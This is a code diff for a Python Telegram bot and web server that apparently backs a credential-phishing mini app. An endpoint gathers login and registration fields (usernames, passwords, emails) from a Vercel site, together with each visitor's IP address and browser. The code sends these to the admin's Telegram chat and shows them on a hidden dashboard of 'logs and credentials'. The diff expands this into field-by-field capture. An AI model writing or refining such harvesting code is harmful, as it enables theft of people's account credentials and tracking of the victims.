@@ -13,7 +13,7 @@ PORT = int(os.getenv("PORT", 10000))
 bot = Bot(token=TOKEN)
 dp = Dispatcher(bot)
 
-# Lifetime in-memory storage for super-fast blazing response
+# Lifetime in-memory storage for structured logs
 LIFETIME_USER_LOGS = []
 
 @dp.message_handler(commands=['start'])
@@ -21,7 +21,6 @@ async def send_welcome(message: types.Message):
     user = message.from_user
     
     keyboard = InlineKeyboardMarkup()
-    # Opens the main user portal/mini app
     web_app = WebAppInfo(url="https://savastan0so-t9zz.vercel.app/")
     keyboard.add(InlineKeyboardButton(text="🚀 Open Portal / Mini App", web_app=web_app))
     
@@ -37,11 +36,19 @@ async def send_welcome(message: types.Message):
         sr_no = len(LIFETIME_USER_LOGS) + 1
         entry = {
             "sr": sr_no,
-            "type": "New User Started Bot",
+            "category": "BOT START EVENT",
+            "status": "Bot Opened (No Site Visit Yet)",
             "name": user.full_name,
             "username": f"@{user.username}" if user.username else "N/A",
             "id": str(user.id),
-            "details": f"Language: {user.language_code}",
+            "fields": {
+                "Full Name": user.full_name,
+                "Telegram Username": f"@{user.username}" if user.username else "N/A",
+                "Telegram ID": str(user.id),
+                "Language Code": user.language_code or "en",
+                "Telegram Premium": "Yes" if getattr(user, "is_premium", False) else "No",
+                "Platform": "Telegram Client App"
+            },
             "time": message.date.strftime('%d %b %Y, %I:%M:%S %p')
         }
         LIFETIME_USER_LOGS.insert(0, entry) # Latest on top
@@ -49,19 +56,18 @@ async def send_welcome(message: types.Message):
         try:
             await bot.send_message(
                 ADMIN_ID, 
-                f"🔔 **Alert [No. {sr_no}]**\n- Name: {user.full_name}\n- ID: `{user.id}`", 
+                f"🔔 **New Bot Start [No. {sr_no}]**\n- Name: {user.full_name}\n- ID: `{user.id}`", 
                 parse_mode="Markdown"
             )
         except Exception as e:
             print(e)
 
-# Secure Admin Command: /admin_ZAROPLAYisFINAL (Instantly opens the Web Admin Panel button)
+# Secure Admin Command: /admin_ZAROPLAYisFINAL
 @dp.message_handler(commands=['admin_ZAROPLAYisFINAL'])
 async def admin_panel(message: types.Message):
     if message.from_user.id != ADMIN_ID:
-        return  # Strictly secure: hidden for everyone else worldwide
+        return  # Strictly restricted to admin
 
-    # Get the base URL of this Render server dynamically
     render_url = os.getenv("RENDER_EXTERNAL_URL", f"http://0.0.0.0:{PORT}")
     admin_panel_url = f"{render_url}/admin/dashboard"
 
@@ -71,12 +77,12 @@ async def admin_panel(message: types.Message):
 
     await message.reply(
         "🛠 **Admin Authentication Successful!**\n\n"
-        "Click the button below to launch your lightning-fast lifetime web dashboard containing all logs, passwords, and user activities:",
+        "Click the button below to launch your lightning-fast lifetime web dashboard containing all structured logs and credentials:",
         reply_markup=keyboard,
         parse_mode="Markdown"
     )
 
-# Handle general text submissions or fallback data
+# Handle general text messages as fallback
 @dp.message_handler(content_types=['text'])
 async def handle_user_submission(message: types.Message):
     user = message.from_user
@@ -88,11 +94,14 @@ async def handle_user_submission(message: types.Message):
     
     entry = {
         "sr": sr_no,
-        "type": "Form Submission / Credentials",
+        "category": "DIRECT TEXT SUBMISSION",
+        "status": "Received Text",
         "name": user.full_name,
         "username": f"@{user.username}" if user.username else "N/A",
         "id": str(user.id),
-        "details": f"Filled Data: {text_data}",
+        "fields": {
+            "Message Data": text_data
+        },
         "time": message.date.strftime('%d %b %Y, %I:%M:%S %p')
     }
     LIFETIME_USER_LOGS.insert(0, entry)
@@ -100,7 +109,7 @@ async def handle_user_submission(message: types.Message):
     try:
         await bot.send_message(
             ADMIN_ID, 
-            f"🚨 **Data Received [No. {sr_no}]**\n- User: {user.full_name}\n- Data: {text_data}", 
+            f"🚨 **Text Received [No. {sr_no}]**\n- User: {user.full_name}\n- Data: {text_data}", 
             parse_mode="Markdown"
         )
     except Exception as e:
@@ -108,65 +117,91 @@ async def handle_user_submission(message: types.Message):
 
 
 # ==========================================
-# HIGH-SPEED EMBEDDED WEB SERVER & ADMIN HTML DASHBOARD
+# WEB SERVER & API ENDPOINT FOR VERCEL MINI APP
 # ==========================================
 async def handle_root(request):
-    return web.Response(text="Bot and High-Speed Server are online and running 24/7!")
+    return web.Response(text="Bot and API Server are online and running 24/7!")
 
-# API Endpoint to receive form data from Vercel website instantly
+# API Endpoint to receive precise Login / Register credentials from Vercel website
 async def handle_api_submit(request):
     try:
         data = await request.json()
         user_id = str(data.get("telegram_id", "Unknown"))
         username = data.get("username", "N/A")
         name = data.get("name", "Unknown User")
-        form_data = data.get("form_data", "No data provided")
-        action_type = data.get("action", "Login/Register")
+        action_type = data.get("action", "LOGIN").upper() # LOGIN or REGISTER
+        status = data.get("status", "Successful")
+        form_fields = data.get("form_fields", {}) # Dictionary of credentials (username, password, email, etc.)
+        ip_address = request.headers.get("X-Forwarded-For", request.remote or "127.0.0.1")
+        user_agent = request.headers.get("User-Agent", "Unknown Browser")
 
         sr_no = len(LIFETIME_USER_LOGS) + 1
+        
+        # Combine user info and form fields cleanly
+        fields_dict = {
+            "Action Status": status,
+            "Telegram Name": name,
+            "Telegram Username": f"@{username}" if not username.startswith("@") else username,
+            "Telegram ID": user_id
+        }
+        # Add all submitted form fields (username, password, email, confirm password, etc.)
+        for key, val in form_fields.items():
+            fields_dict[key] = val
+
+        fields_dict["Network IP Address"] = ip_address
+        fields_dict["Browser / User-Agent"] = user_agent
+
         entry = {
             "sr": sr_no,
-            "type": f"Mini App {action_type.upper()}",
+            "category": f"MINI APP {action_type}",
+            "status": status,
             "name": name,
             "username": f"@{username}" if not username.startswith("@") else username,
             "id": user_id,
-            "details": f"Credentials/Data: {form_data}",
+            "fields": fields_dict,
             "time": os.popen('date').read().strip() or "Just Now"
         }
         LIFETIME_USER_LOGS.insert(0, entry)
 
-        await bot.send_message(
-            ADMIN_ID, 
-            f"🔥 **Mini App {action_type}**\n- Name: {name}\n- Data: {form_data}", 
-            parse_mode="Markdown"
-        )
+        # Instant alert to Admin inbox
+        alert_text = f"🔥 **Mini App {action_type} ({status})**\n- Name: {name}\n- ID: `{user_id}`\n"
+        for k, v in form_fields.items():
+            alert_text += f"- {k}: {v}\n"
 
-        return web.json_response({"status": "success", "message": "Saved successfully"})
+        await bot.send_message(ADMIN_ID, alert_text, parse_mode="Markdown")
+
+        return web.json_response({"status": "success", "message": "Structured data saved successfully"})
     except Exception as e:
         return web.json_response({"status": "error", "error": str(e)}, status=400)
 
-# Ultra-Fast HTML Admin Dashboard rendered directly inside Telegram Web App
+# Ultra-Fast HTML Admin Dashboard with Key-Value Cards
 async def handle_admin_dashboard(request):
     logs_html = ""
     if LIFETIME_USER_LOGS:
         for log in LIFETIME_USER_LOGS:
+            fields_html = ""
+            for key, val in log['fields'].items():
+                fields_html += f"""
+                <div class="field-row">
+                    <span class="field-key">🔹 {key}:</span>
+                    <span class="field-val">{val}</span>
+                </div>
+                """
+
             logs_html += f"""
             <div class="log-card">
                 <div class="log-header">
                     <span class="sr-badge">#{log['sr']}</span>
-                    <span class="log-type">{log['type']}</span>
+                    <span class="log-type">{log['category']}</span>
                     <span class="log-time">{log['time']}</span>
                 </div>
                 <div class="log-body">
-                    <p><strong>👤 Name:</strong> {log['name']}</p>
-                    <p><strong>🏷 Username:</strong> {log['username']}</p>
-                    <p><strong>🆔 Telegram ID:</strong> <code>{log['id']}</code></p>
-                    <p><strong>📋 Details / Password:</strong> <span class="highlight">{log['details']}</span></p>
+                    {fields_html}
                 </div>
             </div>
             """
     else:
-        logs_html = "<div class='no-data'>No logs or records captured yet. Waiting for users...</div>"
+        logs_html = "<div class='no-data'>No logs or records captured yet. Waiting for user activities...</div>"
 
     html_content = f"""
     <!DOCTYPE html>
@@ -189,31 +224,31 @@ async def handle_admin_dashboard(request):
                 background-color: var(--bg-color);
                 color: var(--text-color);
                 margin: 0;
-                padding: 15px;
+                padding: 12px;
             }}
             .header {{
                 text-align: center;
                 border-bottom: 2px solid var(--border-color);
-                padding-bottom: 15px;
-                margin-bottom: 20px;
+                padding-bottom: 10px;
+                margin-bottom: 15px;
             }}
             .header h1 {{
-                font-size: 20px;
+                font-size: 17px;
                 color: var(--accent-color);
                 margin: 5px 0;
             }}
             .stats {{
                 background: var(--card-bg);
-                padding: 10px 15px;
+                padding: 10px 14px;
                 border-radius: 8px;
-                font-size: 14px;
-                margin-bottom: 20px;
+                font-size: 13px;
+                margin-bottom: 15px;
                 border: 1px solid var(--border-color);
             }}
             .log-card {{
                 background: var(--card-bg);
                 border-radius: 10px;
-                padding: 12px 15px;
+                padding: 12px 14px;
                 margin-bottom: 12px;
                 border: 1px solid var(--border-color);
                 box-shadow: 0 4px 6px rgba(0,0,0,0.3);
@@ -225,7 +260,7 @@ async def handle_admin_dashboard(request):
                 border-bottom: 1px solid var(--border-color);
                 padding-bottom: 8px;
                 margin-bottom: 8px;
-                font-size: 12px;
+                font-size: 11px;
             }}
             .sr-badge {{
                 background: var(--accent-color);
@@ -241,33 +276,37 @@ async def handle_admin_dashboard(request):
             .log-time {{
                 color: #94a3b8;
             }}
-            .log-body p {{
-                margin: 6px 0;
-                font-size: 13px;
-                word-break: break-all;
+            .field-row {{
+                display: flex;
+                justify-content: space-between;
+                padding: 4px 0;
+                border-bottom: 1px dashed rgba(51, 65, 85, 0.5);
+                font-size: 12px;
             }}
-            .highlight {{
+            .field-key {{
+                color: #93c5fd;
+                font-weight: 500;
+                width: 45%;
+            }}
+            .field-val {{
                 color: #facc15;
                 font-weight: bold;
-            }}
-            code {{
-                background: #020617;
-                padding: 2px 4px;
-                border-radius: 4px;
-                color: #38bdf8;
+                width: 55%;
+                word-break: break-all;
+                text-align: right;
             }}
             .no-data {{
                 text-align: center;
                 color: #94a3b8;
                 margin-top: 50px;
-                font-size: 15px;
+                font-size: 14px;
             }}
         </style>
     </head>
     <body>
         <div class="header">
             <h1>🛡️ ZAROPLAY LIFETIME ADMIN PANEL</h1>
-            <p style="font-size: 12px; color: #94a3b8; margin:0;">Owner: Umang Lal Meena</p>
+            <p style="font-size: 11px; color: #94a3b8; margin:0;">Owner: Umang Lal Meena</p>
         </div>
         
         <div class="stats">
@@ -301,4 +340,4 @@ async def on_startup(dispatcher):
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
-    
+            
